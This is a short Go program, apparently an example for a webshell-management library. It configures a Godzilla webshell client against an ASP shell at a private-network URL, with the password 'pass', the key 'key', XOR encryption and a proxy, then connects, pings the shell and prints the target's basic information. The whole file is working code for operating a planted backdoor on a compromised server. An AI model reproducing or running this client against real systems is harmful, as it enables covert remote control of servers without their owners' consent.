package main

import (
	"fmt"
	"github.com/Go0p/wsm"
	"github.com/Go0p/wsm/lib/shell"
	"github.com/Go0p/wsm/lib/shell/godzilla"
	"log"
)

const (
	//JspShellUrl = "http://172.20.10.2:8080/bs64.jsp"
	AspShellUrl = "http://10.10.11.10:8081/xorraw.asp"
)

func main() {
	info := &wsm.GodzillaInfo{
		BaseShell: shell.BaseShell{
			Url:      AspShellUrl,
			Password: "pass",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
			// base64 的加密模式必须加上这个 header 头
			Headers: map[string]string{"Content-type": "application/x-www-form-urlencoded"},
		},
		Key:    "key",
		Crypto: godzilla.ASP_XOR_RAW,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.FirstBlood()
	g.Ping(nil)
	basicInfo := g.BasicInfo()
	fmt.Println(basicInfo)
}
